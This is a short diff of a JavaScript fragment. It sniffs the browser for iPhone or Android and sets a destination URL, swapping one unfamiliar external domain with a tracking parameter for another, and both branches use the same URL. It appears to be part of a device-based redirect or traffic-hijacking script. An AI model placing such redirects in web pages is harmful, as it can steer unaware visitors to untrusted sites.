@@ -60,9 +60,9 @@ var e = navigator.userAgent.toLowerCase(),
     b = e.match(/iphone/i) == "iphone",
     c = e.match(/android/i) == "android";
 if (f || b) {
-    var url = 'https://ldd6.xiaolulvyou.com/index.html?t=a046';
+    var url = 'https://sghta.donghanyang.cn/index.html?t=mn_c227147';
 }else{
-    var url = 'https://ldd6.xiaolulvyou.com/index.html?t=a046';
+    var url = 'https://sghta.donghanyang.cn/index.html?t=mn_c227147';
 }
 for (x in d) {
     var img = data[d[x]][0];
